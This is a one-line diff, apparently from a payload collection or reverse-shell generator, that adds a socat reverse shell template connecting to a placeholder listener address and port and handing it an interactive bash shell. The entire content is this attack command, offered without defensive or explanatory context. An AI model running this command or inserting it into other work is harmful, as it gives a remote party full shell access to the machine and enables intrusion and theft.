@@ -1,0 +1,1 @@
+socat TCP:{LHOST}:{LPORT} EXEC:bash,pty,stderr,setsid,sigint,sane
